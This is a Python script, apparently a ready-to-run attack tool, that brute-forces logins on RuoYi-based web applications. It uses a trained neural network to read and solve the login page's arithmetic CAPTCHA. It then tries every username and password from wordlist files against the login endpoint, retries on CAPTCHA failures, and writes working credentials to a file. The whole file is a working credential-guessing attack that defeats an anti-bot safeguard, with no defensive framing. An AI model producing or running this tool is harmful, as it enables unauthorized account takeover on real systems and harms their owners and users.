import argparse
import requests
from PIL import Image
import torch
from torchvision import transforms
import base64
import re
import json
import common
from Net import Net
from one_hot import vec2Text

# 初始化网络模型
net = Net()

def predict(inputs):
    net.eval()
    device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')
    net.to(device)
    with torch.no_grad():
        outputs = net(inputs)
        outputs = outputs.view(-1, len(common.captcha_array))
    return vec2Text(outputs)

def clean_text(text):
    text = text.strip()  # 去除首尾空格
    text = text.replace('？', '?')  # 替换中文问号为英文问号
    return text

def evaluate_expression_from_model_output(model_output):
    model_output = clean_text(model_output)
    
    pattern = r'(\d+)\s*([+\-×*/÷])\s*(\d+)\s*=?'
    match = re.search(pattern, model_output)
    
    if match:
        num1, operator, num2 = match.groups()
        num1, num2 = int(num1), int(num2)
        
        if operator == '+':
            result = num1 + num2
        elif operator == '-':
            result = num1 - num2
        elif operator in ['×', '*']:
            result = num1 * num2
        elif operator in ['/', '÷']:
            result = num1 / num2
            result = int(result)  # 保留整数部分
        else:
            raise ValueError(f"不支持的运算符: {operator}")
        
        print(f"识别的表达式: {model_output}, 计算结果: {result}")
        return result
    else:
        raise ValueError("表达式格式不符合预期。")

def get_captcha_result(captcha_url):
    res = requests.get(captcha_url)
    json_data = res.json()
    
    img_base64 = json_data.get("img")
    uuid = json_data.get("uuid")

    if not img_base64 or not uuid:
        print("验证码图片或UUID获取失败。")
        return None, None

    img_data = base64.b64decode(img_base64)
    filepath = 'code.jpg'
    with open(filepath, "wb") as f:
        f.write(img_data)

    img = Image.open(filepath)
    trans = transforms.Compose([
        transforms.Resize((60, 160)),
        transforms.ToTensor()
    ])
    img_tensor = trans(img)
    img_tensor = img_tensor.unsqueeze(0)  # 添加批次维度

    model_path = 'model.pth'
    net.eval()
    net.load_state_dict(torch.load(model_path, map_location=torch.device('cpu'))['model_state_dict'])

    output = net(img_tensor)
    output = output.view(-1, len(common.captcha_array))
    output_text = vec2Text(output)
    
    print(f"模型输出文本: {output_text}")
    
    try:
        result = evaluate_expression_from_model_output(output_text)
        return str(result), uuid  # 返回验证码结果和UUID
    except ValueError as e:
        print(f"处理表达式时出错: {e}")
        return None, None

def login(username, password, validate_code, uuid, login_url):
    data = {
        "username": username,
        "password": password,
        "code": validate_code,
        "uuid": uuid  # 动态替换UUID
    }
    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }
    response = requests.post(login_url, json=data, headers=headers)
    return response.json()

def save_successful_login(username, password, login_url, output_file):
    result = {
        "URL": login_url,
        "用户名": username,
        "密码": password
    }
    
    with open(output_file, 'a', encoding='utf-8') as f:
        f.write(json.dumps(result, ensure_ascii=False) + '\n')

def enumerate_credentials(user_file, password_file, login_url, captcha_url, output_file):
    with open(user_file, 'r') as user_file, open(password_file, 'r') as password_file:
        users = user_file.readlines()
        passwords = password_file.readlines()
    
    for username in users:
        for password in passwords:
            username = username.strip()
            password = password.strip()
            print("-----------------------------------------")
            print(f"尝试用户名: {username}, 密码: {password}")
            
            while True:
                validate_code, uuid = get_captcha_result(captcha_url)
                
                if validate_code and uuid:
                    print(f"验证码结果: {validate_code}")
                    response = login(username, password, validate_code, uuid, login_url)
                    print(f"服务器响应: {response}")
                    if response.get('code') == 200:
                        print("成功登录！")
                        save_successful_login(username, password, login_url, output_file)
                        break  # 跳出内层循环，继续下一个密码
                    elif response.get('msg') == '验证码错误':
                        print("验证码错误，重新获取验证码并重试...")
                        continue  # 继续当前循环，重新获取验证码
                    else:
                        break  # 跳出内层循环，尝试下一个密码
                else:
                    print("验证码识别失败，无法进行登录。")
                    break  # 跳出内层循环，尝试下一个密码
    
    print("所有尝试均完成。")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="若依（前后端分离版）验证码识别爆破工具")
    parser.add_argument('-u', '--url', type=str, required=True, help='登录接口URL')
    parser.add_argument('-c', '--captcha', type=str, required=True, help='验证码URL')
    parser.add_argument('-o', '--output', type=str, default='result_json.txt', help='指定输出文件路径，默认生成result_json.txt')
    args = parser.parse_args()
    
    enumerate_credentials('username.txt', 'password.txt', args.url, args.captcha, args.output)
